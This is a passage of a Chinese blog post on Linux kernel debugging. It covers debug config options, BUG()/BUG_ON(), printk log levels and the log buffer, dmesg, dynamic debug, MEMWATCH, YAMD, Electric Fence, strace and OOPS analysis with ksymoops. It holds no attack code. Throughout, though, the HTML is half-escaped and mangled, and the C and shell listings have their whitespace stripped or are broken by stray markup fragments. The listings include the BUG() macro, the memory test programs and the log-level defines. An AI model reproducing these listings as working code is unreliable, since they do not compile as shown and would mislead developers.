false;&quot;&gt;`slablayerdebugging（slab层调试选项）high-memorydebugging（高端内存调试选项）I/Omappingdebugging（I/O映射调试选项）spin-lockdebugging（自旋锁调试选项）stack-overflowchecking（栈溢出检查选项）sleep-inside-spinlockchecking（自旋锁内睡眠选项）`&lt;/pre&gt; &lt;span id=&quot;OSC_h4_5&quot;&gt;&lt;/span&gt;#### &lt;span style=&quot;vertical-align:baseline;&quot;&gt;2 调试原子操作&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;从内核2.5开发，为了检查各类由原子操作引发的问题，内核提供了极佳的工具。&lt;/span&gt;  &lt;span style=&quot;vertical-align:baseline;&quot;&gt;内核提供了一个原子操作计数器，它可以配置成，一旦在原子操作过程中，进城进入睡眠或者做了一些可能引起睡眠的操作，就打印警告信息并提供追踪线索。&lt;/span&gt;  &lt;span style=&quot;vertical-align:baseline;&quot;&gt;所以，包括在使用锁的时候调用schedule()，正使用锁的时候以阻塞方式请求分配内存等，各种潜在的bug都能够被探测到。&lt;/span&gt;  &lt;span style=&quot;vertical-align:baseline;&quot;&gt;下面这些选项可以最大限度地利用该特性：&lt;/span&gt; &lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`CONFIG_PREEMPT=yCONFIG_DEBUG_KERNEL=yCONFIG_KLLSYMS=yCONFIG_SPINLOCK_SLEEP=y`&lt;/pre&gt; #### &lt;span style=&quot;vertical-align:baseline;&quot;&gt; &lt;/span&gt; &lt;span id=&quot;OSC_h3_6&quot;&gt;&lt;/span&gt;### &lt;span style=&quot;vertical-align:baseline;&quot;&gt;四 引发bug并打印信息&lt;/span&gt; &lt;span id=&quot;OSC_h4_7&quot;&gt;&lt;/span&gt;#### &lt;span style=&quot;vertical-align:baseline;&quot;&gt;1 BUG()和BUG_ON()&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;一些内核调用可以用来方便标记bug，提供断言并输出信息。最常用的两个是BUG()和BUG_ON()。&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;定义在&lt;include/asm-generic&gt;中：&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;&lt;span style=&quot;vertical-align:baseline;&quot;&gt;&lt;/span&gt;&lt;/span&gt; &lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`#ifndefHAVE_ARCH_BUG#defineBUG()do{printk(&quot;BUG:failureat%s:%d/%s()!&quot;,__FILE__,__LINE__,__FUNCTION__);panic(&quot;BUG!&quot;);/*引发更严重的错误，不但打印错误消息，而且整个系统业会挂起*/}while(0)#endif#ifndefHAVE_ARCH_BUG_ON#defineBUG_ON(condition)do{if(unlikely(condition))BUG();}while(0)#endif`&lt;/pre&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;当调用这两个宏的时候，它们会引发OOPS，导致栈的回溯和错误消息的打印。&lt;/span&gt;  &lt;span style=&quot;vertical-align:baseline;&quot;&gt;※ 可以把这两个调用当作断言使用，如：BUG_ON(bad_thing);&lt;/span&gt;  &lt;span style=&quot;vertical-align:baseline;&quot;&gt;&lt;/span&gt; &lt;span id=&quot;OSC_h4_8&quot;&gt;&lt;/span&gt;#### &lt;span style=&quot;vertical-align:baseline;&quot;&gt;2 dump_stack()&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;有些时候，只需要在终端上打印一下栈的回溯信息来帮助你调试。这时可以使用dump_stack()。这个函数只在终端上打印寄存器上下文和函数的跟踪线索。&lt;/span&gt; &lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`if(!debug_check){printk(KERN_DEBUG“providesomeinformation…/n”);dump_stack();}`&lt;/pre&gt; &lt;span id=&quot;OSC_h3_9&quot;&gt;&lt;/span&gt;### &lt;span style=&quot;vertical-align:baseline;&quot;&gt;五 printk()&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;内核提供的格式化打印函数。&lt;/span&gt; &lt;span id=&quot;OSC_h4_10&quot;&gt;&lt;/span&gt;#### &lt;span style=&quot;vertical-align:baseline;&quot;&gt;1 printk函数的健壮性&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;健壮性是printk最容易被接受的一个特质，几乎在任何地方，任何时候内核都可以调用它（中断上下文、进程上下文、持有锁时、多处理器处理时等）。&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt; &lt;/span&gt; &lt;span id=&quot;OSC_h4_11&quot;&gt;&lt;/span&gt;#### &lt;span style=&quot;vertical-align:baseline;&quot;&gt;2 printk函数脆弱之处&lt;/span&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;在系统启动过程中，终端初始化之前，在某些地方是不能调用的。如果真的需要调试系统启动过程最开始的地方，有以下方法可以使用：&lt;/span&gt; </code></pre><ul><li><span style="vertical-align:baseline;">使用串口调试，将调试信息输出到其他终端设备。</span></li><li><p><span style="vertical-align:baseline;">使用early_printk()，该函数在系统启动初期就有打印能力。但它只支持部分硬件体系。</span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span id="OSC_h4_12"></span></p><h4 id="3-LOG等级"><a href="#3-LOG等级" class="headerlink" title="3 LOG等级"></a><span style="vertical-align:baseline;">3 LOG等级</span></h4><p><span style="vertical-align:baseline;">printk和printf一个主要的区别就是前者可以指定一个LOG等级。内核根据这个等级来判断是否在终端上打印消息。内核把比指定等级高的所有消息显示在终端。</span><br> <span style="vertical-align:baseline;">可以使用下面的方式指定一个LOG级别：</span><br> <span style="vertical-align:baseline;">printk(KERN_CRIT “Hello, world!\n”);</span><br> <span style="vertical-align:baseline;">注意，第一个参数并不一个真正的参数，因为其中没有用于分隔级别（KERN_CRIT）和格式字符的逗号（,）。KERN_CRIT本身只是一个普通的字符串（事实上，它表示的是字符串 “<2>“；表 1 列出了完整的日志级别清单）。作为预处理程序的一部分，C 会自动地使用一个名为 字符串串联 的功能将这两个字符串组合在一起。组合的结果是将日志级别和用户指定的格式字符串包含在一个字符串中。</2></span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">内核使用这个指定LOG级别与当前终端LOG等级console_loglevel来决定是不是向终端打印。</span><br> <span style="vertical-align:baseline;">下面是可使用的LOG等级：</span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`#defineKERN_EMERG"<0>"/*systemisunusable*/#defineKERN_ALERT"<1>"/*actionmustbetakenimmediately*/#defineKERN_CRIT"<2>"/*criticalconditions*/#defineKERN_ERR"<3>"/*errorconditions*/#defineKERN_WARNING"<4>"/*warningconditions*/#defineKERN_NOTICE"<5>"/*normalbutsignificantcondition*/#defineKERN_INFO"<6>"/*informational*/#defineKERN_DEBUG"<7>"/*debug-levelmessages*/#defineKERN_DEFAULT"<d>"/*Usethedefaultkernelloglevel*/`</d></7></6></5></4></3></2></1></0></pre> <p><span style="vertical-align:baseline;">注意，如果调用者未将日志级别提供给 printk，那么系统就会使用默认值 KERN_WARNING “<4>“（表示只有KERN_WARNING 级别以上的日志消息会被记录）。由于默认值存在变化，所以在使用时最好指定LOG级别。有LOG级别的一个好处就是我们可以选择性的输出LOG。比如平时我们只需要打印KERN_WARNING级别以上的关键性LOG，但是调试的时候，我们可以选择打印KERN_DEBUG等以上的详细LOG。而这些都不需要我们修改代码，只需要通过命令修改默认日志输出级别：</4></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`mtj@ubuntu:~$cat/proc/sys/kernel/printk4417mtj@ubuntu:~$cat/proc/sys/kernel/printk_delay0mtj@ubuntu:~$cat/proc/sys/kernel/printk_ratelimit5mtj@ubuntu:~$cat/proc/sys/kernel/printk_ratelimit_burst10`</pre> <p><span style="vertical-align:baseline;">第一项定义了 printk API 当前使用的日志级别。这些日志级别表示了控制台的日志级别、默认消息日志级别、最小控制台日志级别和默认控制台日志级别。printk_delay 值表示的是 printk 消息之间的延迟毫秒数（用于提高某些场景的可读性）。注意，这里它的值为 0，而它是不可以通过 /proc 设置的。printk_ratelimit 定义了消息之间允许的最小时间间隔（当前定义为每 5 秒内的某个内核消息数）。消息数量是由 printk_ratelimit_burst 定义的（当前定义为 10）。如果您拥有一个非正式内核而又使用有带宽限制的控制台设备（如通过串口）， 那么这非常有用。注意，在内核中，速度限制是由调用者控制的，而不是在printk 中实现的。如果一个 printk 用户要求进行速度限制，那么该用户就需要调用printk_ratelimit 函数。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_13"></span></p><h4 id="4-记录缓冲区"><a href="#4-记录缓冲区" class="headerlink" title="4 记录缓冲区"></a><span style="vertical-align:baseline;">4 记录缓冲区</span></h4><p><span style="vertical-align:baseline;">内核消息都被保存在一个LOG_BUF_LEN大小的环形队列中。</span><br> <span style="vertical-align:baseline;">关于LOG_BUF_LEN定义：</span> <span style="vertical-align:baseline;"><br> </span></p><pre class="brush:cpp; toolbar: true; auto-links: false;">`#define__LOG_BUF_LEN(1<<config_log_buf_shift)`< pre=""> <span style="vertical-align:baseline;">※ 变量CONFIG_LOG_BUF_SHIFT在内核编译时由配置文件定义，对于i386平台，其值定义如下（在linux26/arch/i386/defconfig中）：</span> <pre class="brush:cpp; toolbar: true; auto-links: false;">`CONFIG_LOG_BUF_SHIFT=18`</pre> <p><span style="vertical-align:baseline;">记录缓冲区操作：</span><br> <span style="vertical-align:baseline;">① 消息被读出到用户空间时，此消息就会从环形队列中删除。</span><br> <span style="vertical-align:baseline;">② 当消息缓冲区满时，如果再有printk()调用时，新消息将覆盖队列中的老消息。</span><br> <span style="vertical-align:baseline;">③ 在读写环形队列时，同步问题很容易得到解决。</span> </p><p><span style="vertical-align:baseline;">※ 这个纪录缓冲区之所以称为环形，是因为它的读写都是按照环形队列的方式进行操作的。</span><span style="font-size:13px;color:#333333;background-color:#FFFFFF;vertical-align:baseline;"></span> </p><p><span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_14"></span></p><h4 id="5-syslogd-klogd"><a href="#5-syslogd-klogd" class="headerlink" title="5 syslogd/klogd"></a><span style="vertical-align:baseline;">5 syslogd/klogd</span></h4><p><span style="vertical-align:baseline;">在标准的Linux系统上，用户空间的守护进程klogd从纪录缓冲区中获取内核消息，再通过syslogd守护进程把这些消息保存在系统日志文件中。klogd进程既可以从/proc/kmsg文件中，也可以通过syslog()系统调用读取这些消息。默认情况下，它选择读取/proc方式实现。klogd守护进程在消息缓冲区有新的消息之前，一直处于阻塞状态。一旦有新的内核消息，klogd被唤醒，读出内核消息并进行处理。默认情况下，处理例程就是把内核消息传给syslogd守护进程。syslogd守护进程一般把接收到的消息写入/var/log/messages文件中。不过，还是可以通过/etc/syslog.conf文件来进行配置，可以选择其他的输出文件。</span> </p><p><span style="font-size:13px;color:#333333;background-color:#FFFFFF;vertical-align:baseline;"></span><img src="http://static.oschina.net/uploads/img/201303/12162520_Gm0j.jpg" alt=""> </p><p><span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_15"></span></p><h4 id="6-dmesg"><a href="#6-dmesg" class="headerlink" title="6 dmesg"></a><span style="vertical-align:baseline;">6 dmesg</span></h4><p><span style="vertical-align:baseline;">dmesg 命令也可用于打印和控制内核环缓冲区。这个命令使用 klogctl 系统调用来读取内核环缓冲区，并将它转发到标准输出（stdout）。这个命令也可以用来清除内核环缓冲区（使用 -c 选项），设置控制台日志级别（-n 选项），以及定义用于读取内核日志消息的缓冲区大小（-s 选项）。注意，如果没有指定缓冲区大小，那么 dmesg 会使用 klogctl 的SYSLOG_ACTION_SIZE_BUFFER 操作确定缓冲区大小。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_16"></span></p><h4 id="7-注意"><a href="#7-注意" class="headerlink" title="7 注意"></a><span style="vertical-align:baseline;">7 注意</span></h4><p><span style="vertical-align:baseline;">a) 虽然printk很健壮，但是看了源码你就知道，这个函数的效率很低：做字符拷贝时一次只拷贝一个字节，且去调用console输出可能还产生中断。所以如果你的驱动在功能调试完成以后做性能测试或者发布的时候千万记得尽量减少printk输出，做到仅在出错时输出少量信息。否则往console输出无用信息影响性能。</span><br> <span style="vertical-align:baseline;">b) printk的临时缓存printk_buf只有1K，所有一次printk函数只能记录<1k的信息到log buffer，并且printk使用的“ringbuffer”.<="" span=""><br> <span style="vertical-align:baseline;"></span> </1k的信息到log></span></p><p><span id="OSC_h4_17"></span></p><h4 id="8-内核printk和日志系统的总体结构"><a href="#8-内核printk和日志系统的总体结构" class="headerlink" title="8 内核printk和日志系统的总体结构"></a><span style="vertical-align:baseline;">8 内核printk和日志系统的总体结构</span><img src="http://static.oschina.net/uploads/img/201303/12162606_fEh3.jpg" alt=""></h4><p><span style="vertical-align:baseline;"><br> </span> </p><p><span id="OSC_h4_18"></span></p><h4 id="9-动态调试"><a href="#9-动态调试" class="headerlink" title="9 动态调试"></a><span style="vertical-align:baseline;">9 动态调试</span></h4><p><span style="vertical-align:baseline;">动态调试是通过动态的开启和禁止某些内核代码来获取额外的内核信息。</span><br> <span style="vertical-align:baseline;">首先内核选项CONFIG_DYNAMIC_DEBUG应该被设置。所有通过pr_debug()/dev_debug()打印的信息都可以动态的显示或不显示。</span><br> <span style="vertical-align:baseline;">可以通过简单的查询语句来筛选需要显示的信息。</span> </p><p><span style="vertical-align:baseline;">－源文件名</span> </p><p><span style="vertical-align:baseline;">－函数名</span> </p><p><span style="vertical-align:baseline;">－行号（包括指定范围的行号）</span> </p><p><span style="vertical-align:baseline;">－模块名</span> </p><p><span style="vertical-align:baseline;">－格式化字符串</span> </p><p><span style="vertical-align:baseline;">将要打印信息的格式写入<debugfs>/dynamic_debug/control中。</debugfs></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`nullarbor:~#echo'filesvcsock.cline1603+p'><debugfs>/dynamic_debug/control`</debugfs></pre> <p> <span style="vertical-align:baseline;">参考：</span><br> <span style="vertical-align:baseline;">1 </span> <a href="http://blog.chinaunix.net/uid-26993600-id-3252420.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">内核日志及printk结构浅析</span></a> <span style="vertical-align:baseline;">–</span> <a href="http://blog.chinaunix.net/uid/20543672.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">Tekkaman Ninja</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">2 </span> <a href="http://www.ibm.com/developerworks/cn/linux/l-kernel-logging-apis/index.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">内核日志：API 及实现</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">3 </span> <a href="http://blog.chinaunix.net/uid-22227409-id-2656917.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">printk实现分析</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">4 </span> <a href="http://www.mjmwired.net/kernel/Documentation/dynamic-debug-howto.txt" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">dynamic-debug-howto.txt</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h3_19"></span></p><h3 id="六-内存调试工具"><a href="#六-内存调试工具" class="headerlink" title="六 内存调试工具"></a><span style="vertical-align:baseline;">六 内存调试工具</span></h3><p><span id="OSC_h4_20"></span></p><h4 id="1-MEMWATCH"><a href="#1-MEMWATCH" class="headerlink" title="1 MEMWATCH"></a><span style="vertical-align:baseline;">1 MEMWATCH</span></h4><p><span style="vertical-align:baseline;">MEMWATCH 由 Johan Lindh 编写，是一个开放源代码 C 语言内存错误检测工具，您可以自己下载它。只要在代码中添加一个头文件并在 gcc 语句中定义了 MEMWATCH 之后，您就可以跟踪程序中的内存泄漏和错误了。MEMWATCH 支持ANSIC，它提供结果日志纪录，能检测双重释放（double-free）、错误释放（erroneous free）、没有释放的内存（unfreedmemory）、溢出和下溢等等。</span><br> <span style="vertical-align:baseline;">清单 1. 内存样本（test1.c）</span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`#include<stdlib.h>#include<stdio.h>#include"memwatch.h"intmain(void){char*ptr1;char*ptr2;ptr1=malloc(512);ptr2=malloc(512);ptr2=ptr1;free(ptr2);free(ptr1);}`</stdio.h></stdlib.h></pre> <p><span style="vertical-align:baseline;">清单 1 中的代码将分配两个 512 字节的内存块，然后指向第一个内存块的指针被设定为指向第二个内存块。结果，第二个内存块的地址丢失，从而产生了内存泄漏。</span><br> <span style="vertical-align:baseline;">现在我们编译清单 1 的 memwatch.c。下面是一个 makefile 示例：</span><br> <span style="vertical-align:baseline;">test1</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`gcc-DMEMWATCH-DMW_STDIOtest1.cmemwatchc-otest1`</pre> <p><span style="vertical-align:baseline;">当您运行 test1 程序后，它会生成一个关于泄漏的内存的报告。清单 2 展示了示例 memwatch.log 输出文件。</span> </p><p><span style="vertical-align:baseline;">清单 2. test1 memwatch.log 文件</span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`MEMWATCH2.67Copyright(C)1992-1999JohanLindh...double-free:<4>test1.c(15),0x80517b4wasfreedfromtest1.c(14)...unfreed:<2>test1.c(11),512bytesat0x80519e4{FEFEFEFEFEFEFEFEFEFEFEFE..............}Memoryusagestatistics(global):N)umberofallocationsmade:2L)argestmemoryusage:1024T)otalofallalloc()calls:1024U)nfreedbytestotals:512`</2></4></pre> <p><span style="font-size:10pt;line-height:1.5;vertical-align:baseline;">MEMWATCH 为您显示真正导致问题的行。如果您释放一个已经释放过的指针，它会告诉您。对于没有释放的内存也一样。日志结尾部分显示统计信息，包括泄漏了多少内存，使用了多少内存，以及总共分配了多少内存。</span> <span style="font-size:10pt;line-height:1.5;"></span> </p><p><span style="font-size:10pt;line-height:1.5;vertical-align:baseline;"><br> </span> </p><p><span id="OSC_h4_21"></span></p><h4 id="2-YAMD"><a href="#2-YAMD" class="headerlink" title="2 YAMD"></a><span style="font-size:10pt;line-height:1.5;vertical-align:baseline;">2 YAMD</span></h4><p><span style="vertical-align:baseline;">YAMD 软件包由 Nate Eldredge 编写，可以查找 C 和 C++ 中动态的、与内存分配有关的问题。在撰写本文时，YAMD 的最新版本为 0.32。请下载 yamd-0.32.tar.gz。执行 make 命令来构建程序；然后执行 make install 命令安装程序并设置工具。</span><br> <span style="vertical-align:baseline;">一旦您下载了 YAMD 之后，请在 test1.c 上使用它。请删除 #include memwatch.h 并对 makefile 进行如下小小的修改：</span><br> <span style="vertical-align:baseline;">使用 YAMD 的 test1</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`gcc-gtest1.c-otest1`</pre> <p><span style="vertical-align:baseline;">清单 3 展示了来自 test1 上的 YAMD 的输出。</span><br> <span style="vertical-align:baseline;">清单 3. 使用 YAMD 的 test1 输出</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`YAMDversion0.32Executable:/usr/src/test/yamd-0.32/test1...INFO:NormalallocationofthisblockAddress0x40025e00,size512...INFO:NormalallocationofthisblockAddress0x40028e00,size512...INFO:NormaldeallocationofthisblockAddress0x40025e00,size512...ERROR:MultiplefreeingAtfreeofpointeralreadyfreedAddress0x40025e00,size512...WARNING:MemoryleakAddress0x40028e00,size512WARNING:Totalmemoryleaks:1unfreedallocationstotaling512bytes***FinishedatTue...10:07:152002Allocatedagrandtotalof1024bytes2allocationsAverageof512bytesperallocationMaxbytesallocatedatonetime:102424Kallocedinternally/12Kmappednow/8KmaxVirtualprogramsizeis1416KEnd.`</pre> <p><span style="vertical-align:baseline;">YAMD 显示我们已经释放了内存，而且存在内存泄漏。让我们在清单 4 中另一个样本程序上试试 YAMD。</span><br> <span style="vertical-align:baseline;">清单 4. 内存代码（test2.c） </span></p><pre class="brush:cpp; toolbar: true; auto-links: false;">`#include<stdlib.h>#include<stdio.h>intmain(void){char*ptr1;char*ptr2;char*chptr;inti=1;ptr1=malloc(512);ptr2=malloc(512);chptr=(char*)malloc(512);for(i;i<=512;i++){ chptr[i]="S" ;="" }="" ptr2="ptr1;" free(ptr2);="" free(ptr1);="" free(chptr);="" }`<="" pre=""> <span style="vertical-align:baseline;">您可以使用下面的命令来启动 YAMD：</span> <pre class="brush:shell; toolbar: true; auto-links: false;">`./run-yamd/usr/src/test/test2/test2`</pre> <p><span style="vertical-align:baseline;">清单 5 显示了在样本程序 test2 上使用 YAMD 得到的输出。YAMD 告诉我们在 for 循环中有“越界（out-of-bounds）”的情况。</span><br> <span style="vertical-align:baseline;">清单 5. 使用 YAMD 的 test2 输出</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`Running/usr/src/test/test2/test2Tempoutputto/tmp/yamd-out.1243*********./run-yamd:line101:1248Segmentationfault(coredumped)YAMDversion0.32Startingrun:/usr/src/test/test2/test2Executable:/usr/src/test/test2/test2Virtualprogramsizeis1380K...INFO:NormalallocationofthisblockAddress0x40025e00,size512...INFO:NormalallocationofthisblockAddress0x40028e00,size512...INFO:NormalallocationofthisblockAddress0x4002be00,size512ERROR:Crash...Triedtowriteaddress0x4002c000Seemstobepartofthisblock:Address0x4002be00,size512...Addressinquestionisatoffset512(outofbounds)Willdumpcoreaftercheckingheap.Done.`</pre> <p><span style="vertical-align:baseline;">MEMWATCH 和 YAMD 都是很有用的调试工具，它们的使用方法有所不同。对于 MEMWATCH，您需要添加包含文件memwatch.h 并打开两个编译时间标记。对于链接（link）语句，YAMD 只需要 -g 选项。</span> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_22"></span></p><h4 id="3-Electric-Fence"><a href="#3-Electric-Fence" class="headerlink" title="3 Electric Fence"></a><span style="vertical-align:baseline;">3 Electric Fence</span></h4><p><span style="vertical-align:baseline;">多数 Linux 分发版包含一个 Electric Fence 包，不过您也可以选择下载它。Electric Fence 是一个由 Bruce Perens 编写的malloc()调试库。它就在您分配内存后分配受保护的内存。如果存在 fencepost 错误（超过数组末尾运行），程序就会产生保护错误，并立即结束。通过结合 Electric Fence 和 gdb，您可以精确地跟踪到哪一行试图访问受保护内存。ElectricFence 的另一个功能就是能够检测内存泄漏。</span> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span> </p><p><span id="OSC_h3_23"></span></p><h3 id="七-strace"><a href="#七-strace" class="headerlink" title="七 strace"></a><span style="vertical-align:baseline;">七 strace</span></h3><p><span style="vertical-align:baseline;">strace 命令是一种强大的工具，它能够显示所有由用户空间程序发出的系统调用。strace 显示这些调用的参数并返回符号形式的值。strace 从内核接收信息，而且不需要以任何特殊的方式来构建内核。将跟踪信息发送到应用程序及内核开发者都很有用。在清单 6 中，分区的一种格式有错误，清单显示了 strace 的开头部分，内容是关于调出创建文件系统操作（mkfs ）的。strace 确定哪个调用导致问题出现。</span><br> <span style="vertical-align:baseline;">清单 6. mkfs 上 strace 的开头部分</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`execve("/sbin/mkfs.jfs",["mkfs.jfs","-f","/dev/test1"],&...open("/dev/test1",O_RDWR|O_LARGEFILE)=4stat64("/dev/test1",{st_mode=&,st_rdev=makedev(63,255),...})=0ioctl(4,0x40041271,0xbfffe128)=-1EINVAL(Invalidargument)write(2,"mkfs.jfs:warning-cannotsetb"...,98mkfs.jfs:warning-cannotsetblocksizeonblockdevice/dev/test1:Invalidargument)=98stat64("/dev/test1",{st_mode=&,st_rdev=makedev(63,255),...})=0open("/dev/test1",O_RDONLY|O_LARGEFILE)=5ioctl(5,0x80041272,0xbfffe124)=-1EINVAL(Invalidargument)write(2,"mkfs.jfs:can\'tdeterminedevice"...,..._exit(1)=?`</pre> <p><span style="vertical-align:baseline;">清单 6 显示 ioctl 调用导致用来格式化分区的 mkfs 程序失败。 ioctl BLKGETSIZE64 失败。（ BLKGET-SIZE64 在调用 ioctl的源代码中定义。) BLKGETSIZE64 ioctl 将被添加到 Linux 中所有的设备，而在这里，逻辑卷管理器还不支持它。因此，如果BLKGETSIZE64 ioctl 调用失败，mkfs 代码将改为调用较早的 ioctl 调用；这使得 mkfs 适用于逻辑卷管理器。</span> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">参考：</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/sdk/l-debug/index.html#resources" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">http://www.ibm.com/developerworks/cn/linux/sdk/l-debug/index.html#resources</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h3_24"></span></p><h3 id="八-OOPS"><a href="#八-OOPS" class="headerlink" title="八 OOPS"></a><span style="vertical-align:baseline;">八 OOPS</span></h3><p><span style="vertical-align:baseline;">OOPS（也称 Panic）消息包含系统错误的细节，如 CPU 寄存器的内容等。是内核告知用户有不幸发生的最常用的方式。</span><br> <span style="vertical-align:baseline;">内核只能发布OOPS，这个过程包括向终端上输出错误消息，输出寄存器保存的信息，并输出可供跟踪的回溯线索。通常，发送完OOPS之后，内核会处于一种不稳定的状态。</span><br> <span style="vertical-align:baseline;">OOPS的产生有很多可能原因，其中包括内存访问越界或非法的指令等。</span> </p><p><span style="vertical-align:baseline;">※ 作为内核的开发者，必定将会经常处理OOPS。</span> </p><p><span style="line-height:1.5;font-size:10pt;">※ OOPS中包含的重要信息，对所有体系结构的机器都是完全相同的：寄存器上下文和回溯线索（回溯线索显示了导致错误发生的函数调用链）。</span> </p><p><span style="vertical-align:baseline;"><br> </span> </p><p><span id="OSC_h4_25"></span></p><h4 id="1-ksymoops"><a href="#1-ksymoops" class="headerlink" title="1 ksymoops"></a><span style="vertical-align:baseline;">1 ksymoops</span></h4><p><span style="vertical-align:baseline;">在 Linux 中，调试系统崩溃的传统方法是分析在发生崩溃时发送到系统控制台的 Oops 消息。一旦您掌握了细节，就可以将消息发送到 ksymoops 实用程序，它将试图将代码转换为指令并将堆栈值映射到内核符号。</span> </p><p><span style="vertical-align:baseline;">※ 如：回溯线索中的地址，会通过ksymoops转化成名称可见的函数名。</span> </p><p><span style="vertical-align:baseline;">ksymoops需要几项内容：Oops 消息输出、来自正在运行的内核的 System.map 文件，还有 /proc/ksyms、vmlinux和/proc/modules。</span><br> <span style="vertical-align:baseline;">关于如何使用 ksymoops，内核源代码 /usr/src/linux/Documentation/oops-tracing.txt 中或 ksymoops 手册页上有完整的说明可以参考。Ksymoops 反汇编代码部分，指出发生错误的指令，并显示一个跟踪部分表明代码如何被调用。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">首先，将 Oops 消息保存在一个文件中以便通过 ksymoops 实用程序运行它。清单 7 显示了由安装 JFS 文件系统的 mount命令创建的 Oops 消息。</span><br> <span style="vertical-align:baseline;">清单 7. ksymoops 处理后的 Oops 消息</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`ksymoops2.4.0oni6862.4.17.Optionsused...15:59:37sfb1kernel:UnabletohandlekernelNULLpointerdereferenceatvirtualaddress0000000...15:59:37sfb1kernel:c01588fc...15:59:37sfb1kernel:*pde=0000000...15:59:37sfb1kernel:Oops:0000...15:59:37sfb1kernel:CPU:0...15:59:37sfb1kernel:EIP:0010:[jfs_mount+60/704]...15:59:37sfb1kernel:CallTrace:[jfs_read_super+287/688][get_sb_bdev+563/736][do_kern_mount+189/336][do_add_mount+35/208][do_page_fault+0/1264]...15:59:37sfb1kernel:CallTrace:[<c0155d4f>]......15:59:37sfb1kernel:[<c0106e04... ...15:59:37sfb1kernel:code:8b2d0000000055...="">>EIP;c01588fc<jfs_mount+3c 2c0=""><===== 40="" ...="" trace;c0106cf3<system_call+33="">Code;c01588fc<jfs_mount+3c 2c0="">00000000<_eip>:Code;c01588fc<jfs_mount+3c 2c0=""><===== 0:8b2d00000000mov0x0,%ebp<="====" code;c0158902<jfs_mount+42="" 2c0="">6:55push%ebp`</=====></jfs_mount+3c></_eip></jfs_mount+3c></=====></jfs_mount+3c></c0106e04...></c0155d4f></pre> <p><span style="vertical-align:baseline;">接下来，您要确定 jfs_mount 中的哪一行代码引起了这个问题。Oops 消息告诉我们问题是由位于偏移地址 3c 的指令引起的。做这件事的办法之一是对 jfs_mount.o 文件使用 objdump 实用程序，然后查看偏移地址 3c。Objdump 用来反汇编模块函数，看看您的 C 源代码会产生什么汇编指令。清单 8 显示了使用 objdump 后您将看到的内容，接着，我们查看jfs_mount 的 C 代码，可以看到空值是第 109 行引起的。偏移地址 3c 之所以很重要，是因为 Oops 消息将该处标识为引起问题的位置。</span><br> <span style="vertical-align:baseline;">清单 8. jfs_mount 的汇编程序清单</span> </p><pre class="brush:vb; toolbar: true; auto-links: false;">`109printk("%d\n",*ptr);objdumpjfs_mount.ojfs_mount.o:fileformatelf32-i386Disassemblyofsection.text:00000000<jfs_mount>:0:55push%ebp...2c:e8cf030000call400<chksuper>31:89c3mov%eax,%ebx33:58pop%eax34:85dbtest%ebx,%ebx36:0f8555020000jne291<jfs_mount+0x291>3c:8b2d00000000mov0x0,%ebp<<problemlineabove 42:55push%ebp`<="" pre=""> <p><span style="vertical-align:baseline;"><br> </span> </p><p><span id="OSC_h4_26"></span></p><h4 id="2-kallsyms"><a href="#2-kallsyms" class="headerlink" title="2 kallsyms"></a><span style="vertical-align:baseline;">2 kallsyms</span></h4><p><span 